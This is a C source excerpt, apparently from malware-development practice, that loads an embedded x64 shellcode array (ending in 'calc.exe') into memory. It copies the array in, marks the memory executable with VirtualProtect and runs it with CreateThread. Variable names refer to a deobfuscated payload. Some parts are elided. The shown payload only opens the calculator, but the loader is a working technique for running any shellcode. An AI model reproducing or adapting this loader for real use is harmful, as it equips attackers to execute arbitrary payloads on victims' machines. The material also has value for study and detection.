...
int main() {
	...
	unsigned char test[] = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50
...
, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 };
	...
	printf("The pointer to the address is 0x%p\n", ptest);

	SIZE_T sdeobfuscated = sizeof(test);

	printf("the size of deobfuscated payload is %zu\n", sdeobfuscated);

	printf("press <enter> to allocate: \n");
	getchar();

	PVOID pshellcodeaddress = VirtualAlloc(NULL, sdeobfuscated, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);


	if (pshellcodeaddress == NULL) {
		printf("The virtualallocation failed with error no: %d\n", GetLastError());
	}

	printf("allocated memory at loaction: 0x%p\n", pshellcodeaddress);

	printf("press <enter> to write to the memory\n");
	getchar();

	memcpy(pshellcodeaddress, ptest, sdeobfuscated);

	memset(ptest, 0, sdeobfuscated);

	printf("press <enter> for the alloction of page read write ");
	getchar();


	DWORD dwoldprotection = NULL;

	if (!VirtualProtect(pshellcodeaddress, sdeobfuscated, PAGE_EXECUTE_READWRITE, &dwoldprotection)){
		printf("the virtual protection failed with errorno %d\n",GetLastError());
	}

	printf("virtual protect sucessfully executed\n");


	printf("press <enter> to run");
		getchar();

		if (CreateThread(NULL, NULL, pshellcodeaddress, NULL, NULL, NULL, NULL) == NULL) {
			printf("The createThread failed with error %d",GetLastError());
		}
